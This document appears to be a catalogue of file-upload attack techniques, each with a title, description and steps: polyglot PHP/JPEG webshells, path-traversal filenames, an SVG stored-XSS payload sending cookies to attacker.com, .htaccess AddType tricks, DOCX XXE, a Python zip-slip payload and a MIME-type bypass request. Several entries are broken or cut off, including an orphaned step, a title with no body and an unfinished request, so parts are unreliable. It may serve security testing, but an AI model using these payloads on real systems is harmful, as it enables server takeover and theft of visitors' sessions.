title: RCE via polyglot PHP/JPEG upload
desc: Image upload checked magic bytes but not extension. JPEG with PHP code appended and .php extension executed as PHP.
steps:
1. Create polyglot: prepend JPEG magic bytes to PHP webshell
2. Upload with .php extension
3. Access uploaded file URL — PHP executes

title: Path traversal in filename — overwrite server files
desc: Upload used client-supplied filename directly. Using ../ in filename wrote to arbitrary paths.
steps:
1. Intercept upload request
2. Change filename to: ../../../var/www/html/shell.php
3. File written outside upload directory

title: Stored XSS via SVG upload
desc: Profile allowed SVG uploads. SVG with embedded script executed in every visitor's browser.
steps:
1. Create SVG with <script>fetch('https://attacker.com/?c='+document.cookie)</script>
2. Upload as profile picture
3. Share profile — XSS fires on every visit

title: SSRF via SVG external entity reference
desc: SVG upload triggered server-side fetch of external resources referenced in the SVG. Used to reach internal services.
steps:
1. Create SVG referencing internal URL
2. Upload SVG
3. Server fetches internal URL during processing

title: RCE via .htaccess upload to enable PHP execution
desc: Upload allowed .htaccess files. Uploading .htaccess with AddType directive enabled PHP execution in upload directory.
steps:
1. Upload .htaccess: AddType application/x-httpd-php .jpg
2. Upload PHP webshell as shell.jpg
3. Access shell.jpg — PHP executes

title: XXE via malicious DOCX upload
desc: Document processing extracted XML from DOCX without disabling external entities. XXE allowed reading local files.
steps:
1. Create DOCX with XXE payload in word/document.xml
2. Upload document
3. Server processes XML — local file contents returned

2. Upload image

title: Stored XSS via filename in upload response

title: RCE via zip slip in archive upload
desc: Archive extraction did not sanitize paths. Uploading ZIP with path traversal entries overwrote server files.
steps:
1. Create ZIP with entry: ../../var/www/html/shell.php
2. Upload archive
3. Extraction writes shell outside intended directory
payload:
# Create malicious zip:
python3 -c "
import zipfile
with zipfile.ZipFile('evil.zip','w') as z:
    z.write('shell.php', '../../var/www/html/shell.php')
"

title: MIME type bypass — upload PHP as image/gif
desc: Upload validated Content-Type header but not actual file content. Setting Content-Type: image/gif with PHP content bypassed check.
steps:
1. Create PHP webshell
2. Set Content-Type: image/gif in upload request
3. Server accepts — PHP stored and executable
payload:
POST /upload
Content-Type: multipart/form-data

--boundary
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/gif
